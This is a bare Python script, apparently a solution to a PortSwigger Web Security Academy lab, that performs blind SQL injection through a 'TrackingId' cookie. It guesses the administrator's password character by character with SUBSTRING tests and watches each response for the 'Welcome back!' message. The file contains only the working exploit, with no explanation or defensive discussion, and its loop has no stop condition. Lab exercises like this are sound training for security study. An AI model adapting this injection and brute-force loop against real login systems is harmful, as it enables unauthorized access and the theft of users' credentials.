import requests, string
alphabetList = list(string.printable)
restart = True
counter = 0
password = ""
while restart:
    counter = counter +1
    for item in alphabetList:
        
        trackingIDString = 'W4URlRqveT1sFAsZ\' AND SUBSTRING((SELECT password FROM users WHERE username = \'administrator\'), {}, 1) = \'{}'.format(counter,item)
        cookies = {'TrackingId': trackingIDString,'session':'Mzqip8LyKtEJ17ba1TP93IxkkubNgPzi'}
        data = {'csrf' : 'G0mIOPaSI54gKcZsIW4i7IyV19T8U4CU','username':'asd','password':'aasd'}
        testPostRequest = requests.post("https://ac6a1f511fbf940d80573a090022001d.web-security-academy.net/login",cookies=cookies,data=data)
        resultData = testPostRequest.text
        if "Welcome back!" in resultData:
            password+=item
            print(password)
            break
